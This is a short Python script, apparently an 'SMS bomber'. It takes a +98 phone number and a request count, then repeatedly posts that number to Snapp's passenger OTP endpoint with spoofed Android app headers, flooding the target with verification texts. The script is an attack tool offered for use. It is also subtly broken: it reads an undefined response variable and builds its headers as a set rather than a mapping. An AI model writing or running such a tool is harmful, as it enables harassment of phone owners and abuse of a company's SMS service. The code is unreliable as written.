import requests
import os
import time

os.system('cls' if os.name=='nt' else 'clear')
phone = input("Set Your Number Via +98==>\n\r")
mount = int(input("Number of Requestes==>\n\r"))
snapH = {
   'x-app-name: passenger-android',
   'User-Agent: Android 9 ; Xiaomi Redmi Note 8T ; Passenger/5.9.0',
   'Package-Name: cab.snapp.passenger.play',
   'locale: fa-IR',
   'x-app-version-code: 207',
   'x-app-version: 207',
   'Content-Type: application/json; charset=utf-8',
   'Content-Length: 55',
   'Host: oauth-passenger.snapp.site',
   'Connection: close',
   'Accept-Encoding: gzip, deflate'}
snapD = {"cellphone":phone}

for _ in range(0,mount):
      requests.post("https://oauth-passenger.snapp.site/v2/otp", headers=snapH, json=snapD)
      snapp = snapR.text
      if "OK" in snapp:
          print("Sended")
          time.sleep(1)
      else:
          print("Fuck!")
          time.sleep(10)
print("Happy Life :) By @LiosionQQ")
